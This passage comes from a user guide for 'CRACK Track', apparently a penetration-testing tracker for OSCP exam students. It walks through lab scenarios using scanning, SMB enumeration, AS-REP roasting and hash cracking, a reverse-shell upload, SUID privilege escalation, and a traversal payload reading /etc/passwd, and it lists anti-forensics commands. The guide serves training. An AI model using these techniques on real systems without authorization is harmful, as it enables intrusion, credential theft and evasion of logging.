#     ├── User/group enumeration
#     └── EternalBlue check

# Total: 47 tasks across 3 services
```

**3. Execute Parallel Quick Wins**

CRACK shows you can run these simultaneously:

```bash
# Terminal 1 - HTTP
whatweb http://192.168.45.101
curl http://192.168.45.101/robots.txt

# Terminal 2 - SMB
enum4linux -a 192.168.45.101

# Terminal 3 - SSH
nc 192.168.45.101 22  # Banner grab
searchsploit OpenSSH 8.2
```

All running in parallel saves **15+ minutes**!

**4. Use Search to Focus**

```bash
# Press 'f' to search
Type: QUICK_WIN

# Found 8 quick win tasks:
#   1. whatweb (Port 80)
#   2. robots.txt check
#   3. Anonymous SMB access
#   4. SMB null session
#   5. SSH banner grab
#   6. searchsploit Apache 2.4.41
#   7. searchsploit OpenSSH 8.2
#   8. searchsploit Samba 4.11.6
```

**5. Document Discoveries**

```bash
# Found SMB share with writable directory
# Press 'c' to add credentials
Service: smb
Port: 445
Access: Anonymous write access to \\backup\
Source: enum4linux null session enumeration

# Found SSH username via enumeration
# Press 'd' to document
Type: user
Description: Valid SSH username: admin
Source: SSH user enumeration with metasploit module

# Found directory traversal in web app
# Press 'd' to document
Type: vulnerability
Description: Directory traversal in /download.php?file=
Source: Manual testing - /download.php?file=../../../../etc/passwd
```

**6. Track Progress**

```bash
# Press 's' to show status
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Target: 192.168.45.101
# Progress: 15/47 tasks completed (32%)
# Findings: 3 vulnerabilities, 2 credentials
# Time elapsed: 01:45:00
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**7. Export Timeline**

```bash
crack track timeline 192.168.45.101

# Output:
# 10:00 - Created profile
# 10:05 - Imported nmap (3 services)
# 10:15 - Discovered anonymous SMB access
# 10:30 - Found writable backup share
# 11:00 - Enumerated SSH username: admin
# 11:45 - Found directory traversal vulnerability
# Total: 1h 45min to initial findings
```

**Result**: Organized multi-service enumeration with complete documentation

📚 **Next**: [Scenario 3](#scenario-3-advanced---full-oscp-exam-workflow) for full exam workflow

---

### Scenario 3: Advanced - Full OSCP Exam Workflow

**Goal**: Manage 3 targets during OSCP exam with complete documentation

**Targets**:
- 192.168.45.100 (Linux web server) - 10 points
- 192.168.45.101 (Windows AD) - 20 points
- 192.168.45.102 (Linux privilege escalation) - 20 points

#### Exam Day Strategy with CRACK

**Hour 0-1: Initial Discovery (All Targets)**

```bash
# Terminal 1 - Target 1 scan
nmap -p- --min-rate 1000 192.168.45.100 -oA t1_discovery &

# Terminal 2 - Target 2 scan
nmap -p- --min-rate 1000 192.168.45.101 -oA t2_discovery &

# Terminal 3 - Target 3 scan
nmap -p- --min-rate 1000 192.168.45.102 -oA t3_discovery &

# While scans run, setup CRACK profiles
crack track new 192.168.45.100
crack track new 192.168.45.101
crack track new 192.168.45.102
```

**Hour 1-2: Service Enumeration**

```bash
# Service scans complete for all targets
# Import all scans
crack track import 192.168.45.100 t1_services.xml
crack track import 192.168.45.101 t2_services.xml
crack track import 192.168.45.102 t3_services.xml

# CRACK generates 150+ tasks across all targets

# Check recommendations for each
crack track show 192.168.45.100  # Shows 5 quick wins
crack track show 192.168.45.101  # Shows 8 quick wins
crack track show 192.168.45.102  # Shows 3 quick wins

# Start with target having most quick wins
crack track -i 192.168.45.101
```

**Hour 2-4: Target 2 (Windows AD) - Interactive Mode**

```bash
# In interactive mode for 192.168.45.101
# CRACK guides you through:

# 1. SMB enumeration
# Press 'n' → Runs enum4linux
# Found: Domain users, shares

# 2. Kerberos enumeration
# Press 'n' → Runs GetNPUsers.py
# Found: User 'svc_account' has no pre-auth

# 3. AS-REP Roasting
# Press 'alt' → Alternative commands
# Select: Manual AS-REP roasting
# Variables auto-fill: <TARGET> = 192.168.45.101
# Run: GetNPUsers.py domain/svc_account -dc-ip 192.168.45.101

# 4. Document credential
# Press 'c'
Username: svc_account
Password: [hash found]
Service: kerberos
Source: AS-REP roasting via GetNPUsers.py

# 5. Password cracking
# Press 'alt' → Browse file transfer
# Transfer hash to attacker
# Crack with hashcat

# 6. Document cracked password
# Press 'c'
Username: svc_account
Password: Summer2023!
Source: Hashcat cracked AS-REP hash

# Achievement: Initial foothold in 2 hours!
```

**Hour 4-6: Parallel Work on Other Targets**

```bash
# Switch to Target 1 while waiting for scans on Target 2
crack track -i 192.168.45.100

# Quick wins on web server
# Found WordPress via whatweb
# WPScan finds vulnerable plugin
# Upload reverse shell → Low privilege shell

# Document in CRACK
# Press 'd'
Type: vulnerability
Description: WordPress plugin upload allows PHP execution
Source: WPScan found vulnerable upload plugin v1.2.3

# Meanwhile, Target 2 privilege escalation running
# Switch back and forth as needed
```

**Hour 6-8: Privilege Escalation**

```bash
# Target 1 (Linux) - Privesc phase
crack track -i 192.168.45.100

# CRACK detects shell access, shows privesc tasks:
# • SUID binary search
# • Sudo -l check
# • Linux capabilities
# • Cron jobs
# • Writable /etc/passwd
# • Kernel exploits

# Press 'alt' on SUID task
# Manual method shown:
find / -perm -u=s -type f 2>/dev/null

# Found: /usr/local/bin/backup (unusual SUID)
# Test and exploit → Root!

# Document
# Press 'd'
Type: privilege_escalation
Description: SUID binary /usr/local/bin/backup exploited via PATH hijack
Source: Manual SUID enumeration + GTFOBins research
```

**Hour 8-12: Complete Remaining Targets**

```bash
# Continue switching between targets
# CRACK tracks everything:
# - What you've tried (mark tasks complete)
# - What failed (add notes)
# - What worked (findings + sources)
# - Credentials discovered
# - Timeline of activities
```

**Hour 12-24: Report Writing**

```bash
# Export complete writeups for all targets
crack track export 192.168.45.100 > target1_writeup.md
crack track export 192.168.45.101 > target2_writeup.md
crack track export 192.168.45.102 > target3_writeup.md

# Each writeup includes:
# ✓ Complete command history with timestamps
# ✓ All findings with sources
# ✓ All credentials with where/how found
# ✓ Full attack timeline
# ✓ Manual alternatives used
# ✓ Flag locations

# Timeline for time tracking
crack track timeline 192.168.45.100
# Shows:
# Target 1: Initial access in 2h 30m, Root in 6h 15m

crack track timeline 192.168.45.101
# Target 2: Initial access in 2h 00m, DA in 8h 45m

# Copy relevant sections to official OSCP report template
# All sources documented = happy graders!
```

**Exam Results with CRACK**:
- ✅ Organized enumeration across 3 targets
- ✅ No forgotten tasks or ports
- ✅ Complete documentation with sources
- ✅ Timeline proves no cheating
- ✅ Pass the exam! 🎉

📚 **Pro Tips**: See [Pro Tips & Best Practices](#pro-tips--best-practices)

---

## Feature Deep Dives

### Interactive Mode

**Command**: `crack track -i <TARGET>`

Interactive mode is the **recommended way** to use CRACK Track. It provides:

#### Navigation Flow

```
Launch → Context Display → Menu → User Choice → Execute Action → Save → Repeat
```

#### Context-Aware Menus

CRACK shows different menus based on your current phase:

**No Scans Yet?**
```
What would you like to do?

  1. Quick Scan (Top 1000 Ports)
  2. Full Port Scan (All 65535)
  3. Import existing scan
  4. Custom scan command

💡 OSCP Tip: Always run full port scan (-p-)
```

**Services Detected?**
```
3 services found! Quick wins available 🚀

Quick Wins (5 tasks):
  1. whatweb (Port 80) - 30 seconds
  2. robots.txt check - 5 seconds
  3. Anonymous SMB test - 10 seconds

What would you like to do?
  1. Execute next recommended task
  2. View all tasks
  3. Search for specific task
  4. Document finding
```

**Vulnerabilities Found?**
```
Boom! 💥 You found 3 vulnerabilities

  1. Document findings with sources
  2. Research exploits (searchsploit)
  3. Attempt exploitation
  4. Export to report
```

#### Session Persistence

Every action auto-saves to `~/.crack/sessions/<TARGET>.json`

```bash
# Power outage during exam?
# No problem!

crack track -i 192.168.45.100 --resume

# Output:
# ✓ Restored session from 2025-10-08 14:23:00
# ✓ Last action: Completed SMB enumeration
# ✓ Continue from service-specific phase
```

📚 **Full interactive guide**: [track/README.md - Interactive Mode](track/README.md)

---

### Alternative Commands: Manual Methods

**Hotkey**: Press `alt` in interactive mode

**Purpose**: Execute manual alternatives when automated tools fail

#### Why Alternative Commands?

**Exam Reality**:
- ❌ Gobuster crashes or hangs
- ❌ Wordlist missing or incorrect
- ❌ WAF blocks automated tools
- ❌ Network issues prevent tool execution

**CRACK Solution**:
- ✅ 45+ manual alternatives that always work
- ✅ Auto-filled variables from config/profile
- ✅ Context-aware selection
- ✅ One keypress access

#### Quick Example

```bash
# You're on a gobuster task that's failing
# Press 'alt'

# CRACK shows:
Alternative Commands for Directory Brute-force:

  1. Manual Directory Check
     curl to test common directories

  2. Check robots.txt
     Find disallowed paths

  3. HTTP Headers Inspection
     Inspect response headers for clues

Select [1-3]: 1

# Variables auto-fill:
#   <TARGET> → 192.168.45.100 (from profile)
#   <PORT> → 80 (from task metadata)
#   <DIRECTORY> → Enter: admin

# Final command:
curl http://192.168.45.100:80/admin

Execute? [Y/n]: y
```

#### Alternative Categories

| Category | Count | Examples |
|----------|-------|----------|
| Web Enumeration | 10+ | curl, robots.txt, headers, source review |
| Privilege Escalation | 10+ | SUID, sudo -l, capabilities, cron |
| File Transfer | 10+ | python http.server, base64, nc |
| Database Enum | 10+ | Manual SQL queries, version checks |
| Network Recon | 10+ | nc port check, banner grab, /dev/tcp |
| Anti-Forensics | 10+ | Clear history, log deletion |

#### Variable Auto-Fill Priority

1. **Task Metadata** → Port, service from current task
2. **Profile State** → Target IP, discovered info
3. **Config Variables** → LHOST, LPORT from `~/.crack/config.json`
4. **User Prompt** → Fallback for missing values

📚 **Complete guide**: [track/alternatives/README.md](track/alternatives/README.md)

---

### Wordlist Selection

**Hotkey**: Press `w` in interactive mode

**Purpose**: Smart wordlist discovery and context-aware selection

#### The Problem

```bash
# Common mistakes:
# Using rockyou.txt (14M lines) for web directory enum ❌
# Using common.txt for password cracking ❌
# Missing the perfect wordlist buried in /usr/share/ ❌
```

#### CRACK Solution

```bash
# Press 'w' during any task
# CRACK shows context-aware suggestions:

Wordlist Selection for: Directory Brute-force (Port 80)

Suggested Wordlists (web-enumeration):
  1. common.txt (4.6K lines, 36KB, avg 7.5 chars) [QUICK WIN]
  2. directory-list-2.3-medium.txt (220K lines, 2.2MB)
  3. big.txt (20.5K lines, 202KB)

Options: [b]rowse all, [s]earch, [e]nter path, [c]ancel

Choice: 1
✓ Selected: /usr/share/wordlists/dirb/common.txt
```

#### Context Inference

CRACK automatically selects appropriate wordlist types:

**Web Enumeration** (gobuster, dirb, dirsearch)
→ `/usr/share/wordlists/dirb/common.txt`

**Password Cracking** (hydra, medusa, ncrack)
→ `/usr/share/wordlists/rockyou.txt`

**SSH Brute-force** (hydra ssh)
→ `/usr/share/seclists/Passwords/Common-Credentials/ssh-passwords.txt`

**Parameter Fuzzing** (wfuzz, ffuf)
→ `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`

**Subdomain Enum** (wfuzz vhost)
→ `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

#### CLI Usage

```bash
# Fuzzy matching
crack track --wordlist common 192.168.45.100
# Finds: /usr/share/wordlists/dirb/common.txt

crack track --wordlist rockyou 192.168.45.100
# Finds: /usr/share/wordlists/rockyou.txt
```

---

### Scan Profiles

**Purpose**: Dynamic, environment-aware scanning strategies

#### Built-In Profiles

| Profile | Use Case | Speed | Stealth | OSCP Priority |
|---------|----------|-------|---------|---------------|
| `lab-quick` | Top 1000 ports | ⚡⚡⚡ | 🥷 | MEDIUM |
| `lab-full` | All 65535 ports | ⚡⚡ | 🥷 | **CRITICAL** |
| `stealth-slow` | Paranoid (-T0) | 🐌 | 🥷🥷🥷 | Production only |
| `aggressive-full` | Max speed (-T4) | ⚡⚡⚡ | 💥 | Labs only |
| `udp-common` | UDP top 100 | ⚡⚡ | 🥷 | MEDIUM |

#### In Interactive Mode

```bash
crack track -i 192.168.45.100

# Discovery Phase menu:
Choose scan strategy:

  1. Quick Scan (Top 1000 Ports)
     OSCP labs, CTF - fast initial discovery (1-2 min)

  2. Full Port Scan (All 65535) [RECOMMENDED]
     OSCP labs - comprehensive port discovery (5-10 min)
     ⚠️ OSCP CRITICAL: Always run full port scan

  3. Stealth Scan (Polite - T2)
     Production systems (15-20 min)

Choice: 2

# CRACK shows command with flag explanations:
nmap -p- --min-rate 1000 192.168.45.100 -oA fullscan

Flags:
  -p-: All 65535 ports (finds services on unusual ports)
  --min-rate 1000: Send at least 1000 packets/sec
  -oA: Save all formats (XML for import, .nmap for reading)

Execute? [Y/n]: y
```

#### Environment Awareness

```bash
# Set environment type
crack track set-environment 192.168.45.100 lab

# Lab environment → Shows aggressive scan profiles
# Production environment → Shows stealth profiles only
```

---

### Source Tracking & Reporting

**Why it matters**: OSCP graders WILL ask "How did you find this?"

#### Required Sources

```bash
# ❌ This will fail
crack track finding 192.168.45.100 \
  --type vulnerability \
  --description "SQL injection"

# Error: --source is required

# ✅ This works
crack track finding 192.168.45.100 \
  --type vulnerability \
  --description "SQL injection in id parameter" \
  --source "Manual testing: sqlmap -u 'http://target/page.php?id=1'"
```

#### Timeline Export

```bash
crack track timeline 192.168.45.100

# Output:
# 2025-10-08 12:00:00 - Created target profile
# 2025-10-08 12:05:00 - Imported nmap scan (3 ports)
# 2025-10-08 12:15:00 - Completed: whatweb (Port 80)
# 2025-10-08 12:30:00 - Finding: Directory /admin found via robots.txt
# 2025-10-08 12:45:00 - Credential: admin/password123 (config.php.bak)
# 2025-10-08 13:00:00 - Achievement: Low-privilege shell
# Total: 1 hour to initial access
```

#### OSCP Report Export

```bash
crack track export 192.168.45.100 > writeup.md

# Includes:
# • Executive Summary
# • Service Enumeration (with commands)
# • Vulnerability Assessment
# • Exploitation (step-by-step)
# • Privilege Escalation
# • Proof.txt location
# • Complete Timeline
# • All Sources
```

---

## Keyboard Shortcuts Reference

**Quick access** in interactive mode:

| Key | Action | Description |
|-----|--------|-------------|
| `s` | Status | Show full target status |
| `t` | Task tree | Display task hierarchy |
| `r` | Recommendations | Show next recommended tasks |
| `n` | Next task | Execute next recommended task |
| `f` | Find/search | Search tasks by name/port/tag |
| `w` | Wordlist | Select context-aware wordlist |
| `alt` | Alternatives | Show manual command alternatives |
| `d` | Document | Add finding with source |
| `c` | Credentials | Add discovered credential |
| `h` | Help | Show help menu |
| `q` | Quit | Save and exit (auto-saves) |

**Pro Combo**:
```
'f' → type 'gobuster' → Enter → 'alt' → Select manual alternative → Execute
```

---

## Pro Tips & Best Practices

### 🚀 Speed Up Your Workflow

```bash
# Create alias for interactive mode
echo "alias ct='crack track -i'" >> ~/.bashrc
source ~/.bashrc

# Now just:
ct 192.168.45.100
```

### 🔍 Search Strategies

- **Quick wins**: Search for `QUICK_WIN` tag
- **Port-specific**: Search by port `445` to see all SMB tasks
- **Tool-specific**: Search `gobuster` to find all directory scans
- **Phase-specific**: Search `OSCP:HIGH` for critical tasks

### 📝 Document as You Go

**Don't wait!** Document immediately:
- Press `d` when you find something
- Add sources EVERY time
- Future you will thank present you

### ⚡ Parallel Tasks Save Hours

When CRACK shows "parallel tasks", run them simultaneously:

```bash
# Terminal 1
gobuster dir -u http://target

# Terminal 2
nikto -h http://target

# Terminal 3
curl http://target/robots.txt
```

Mark all complete when done = **hours saved**

### 🎯 Quick Win Priority

Always execute quick wins first:
1. **30 seconds**: whatweb, robots.txt, sitemap.xml
2. **2 minutes**: searchsploit version lookups
3. **5 minutes**: Manual checks (default creds, anonymous access)
4. **10+ minutes**: Brute-forcing (gobuster, hydra)

### 📚 Pre-Exam Checklist

```bash
# Verify config
crack reference --config list

# Expected:
# ✓ LHOST: 192.168.45.200
# ✓ LPORT: 4444
# ✓ WORDLIST: /usr/share/wordlists/dirb/common.txt

# Test interactive mode
crack track -i TEST_TARGET

# Test alternative commands
# Navigate to task → Press 'alt' → Verify execution

# Test exports
crack track export TEST_TARGET > test.md
# Verify timeline includes sources
```

---

## Troubleshooting

### "crack: command not found"

```bash
# Reinstall CRACK
cd /home/kali/OSCP/crack
pip install -e . --break-system-packages

# Or use reinstall script
./reinstall.sh
```

### "Profile not found"

```bash
# List existing targets
crack track list

# Create new profile
crack track new 192.168.45.100
```

### "Import fails"

```bash
# Check file format
file scan.xml  # Should say "XML document"

# Try different format
crack track import 192.168.45.100 scan.gnmap
```

### "No tasks generated after import"

```bash
# Ensure service versions detected
nmap -sV -sC -p 80,445 192.168.45.100 -oA services
crack track import 192.168.45.100 services.xml

# Check profile
crack track show 192.168.45.100
```

### "Variables not auto-filling"

```bash
# Check config exists
cat ~/.crack/config.json

# If missing, auto-detect
crack reference --config auto

# Verify variables
crack reference --config list
```

### "Interactive mode not working"

```bash
# Check Python version (needs 3.8+)
python3 --version

# Reinstall
./reinstall.sh

# Check logs
crack track -i 192.168.45.100 --debug
```

---

## Where to Go Next

### 📚 Documentation Deep Dives

**Track Module** (Comprehensive 1600+ line guide)
- [track/README.md](track/README.md)

**Alternative Commands** (Developer guide + user manual)
- [track/alternatives/README.md](track/alternatives/README.md)

**Reference System** (Config, placeholders, tags)
- [reference/docs/](reference/docs/)

**Main CRACK Overview**
- [README.md](README.md)

### 🎓 Learning Paths

**New to OSCP?**
1. Start with [Scenario 1](#scenario-1-beginner---single-web-server)
2. Master interactive mode keyboard shortcuts
3. Practice documenting findings with sources
4. Review exported timelines

**OSCP Exam Prep?**
1. Study [Scenario 3](#scenario-3-advanced---full-oscp-exam-workflow)
2. Practice managing 3 targets simultaneously
3. Memorize quick win task priorities
4. Test export workflow (writeups + timeline)

**Want to Contribute?**
1. Read [track/README.md - Contributing](track/README.md)
2. Check plugin development guide
3. Add your own service plugins
4. Submit alternative commands

### 💬 Getting Help

**Documentation**:
- This guide - Overview and scenarios
- [track/README.md](track/README.md) - Complete Track module reference
- [CLAUDE.md](CLAUDE.md) - Project architecture and development

**Testing**:
- `tests/track/` - Real working examples
- `tests/track/test_interactive_search.py` - Search system examples
- Run tests: `pytest crack/tests/track/ -v`

---

## Final Words

**CRACK Track** was built by OSCP students who experienced:
- ❌ Forgetting which ports were scanned
- ❌ Losing track of enumeration progress
- ❌ Having no idea what was tried 3 hours ago
- ❌ Frantically writing reports at 2 AM
- ❌ Missing sources for findings

**CRACK solves all of that.**

### What You've Learned

✅ **Installation and setup** (5 minutes)
✅ **Core features** (Track, Reference, Web, Network)
✅ **Three usage scenarios** (Beginner → Advanced)
✅ **Feature deep-dives** (Interactive, alternatives, wordlists)
✅ **Keyboard shortcuts** (Speed up workflow)
✅ **Pro tips** (Pass the exam!)

### Your Next Steps

```bash
# 1. Install CRACK
cd /home/kali/OSCP/crack && ./reinstall.sh

# 2. Setup config
crack reference --config auto

# 3. Try it on a practice target
crack track -i <LAB_TARGET>

# 4. Follow Scenario 1 walkthrough
# (See above for step-by-step)

# 5. Export your first timeline
crack track timeline <LAB_TARGET>

# 6. Celebrate! 🎉
```

---

**Now go pwn some boxes.** 💀

```
 ██████╗    ██████╗     █████╗     ██████╗    ██╗  ██╗
██╔════╝    ██╔══██╗   ██╔══██╗   ██╔════╝    ██║ ██╔╝
██║         ██████╔╝   ███████║   ██║         █████╔╝
██║         ██╔══██╗   ██╔══██║   ██║         ██╔═██╗
╚██████╗    ██║  ██║   ██║  ██║   ╚██████╗    ██║  ██╗
 ╚═════╝    ╚═╝  ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝  ╚═╝

Part of the CRACK Toolkit
Comprehensive Recon & Attack Creation Kit

License: MIT
For: OSCP students, by OSCP students
```

🔗 **GitHub**: https://github.com/CodeBlackwell/Phantom-Protocol
📖 **Full Docs**: https://github.com/CodeBlackwell/Phantom-Protocol/tree/main/crack
⭐ **Star us**: If CRACK helps you pass OSCP!

---

**Version**: 1.0
**Last Updated**: 2025-10-09
**Status**: Production Ready ✅
